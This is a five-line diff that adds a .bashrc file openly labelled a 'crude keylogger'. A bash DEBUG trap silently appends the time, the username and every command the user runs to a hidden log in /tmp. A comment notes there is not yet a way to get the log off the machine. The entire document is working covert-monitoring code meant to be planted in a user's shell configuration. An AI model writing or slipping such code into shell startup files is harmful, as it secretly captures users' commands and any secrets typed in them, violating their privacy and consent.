@@ -1,0 +1,5 @@
+# Crude keylogger - make this the .bashrc in the users directory
+export TERM=xterm-mono
+
+# no way to get this off the box yet
+trap 'echo "$(date):$USER":"$BASH_COMMAND" >>/tmp/.commands.log' DEBUG
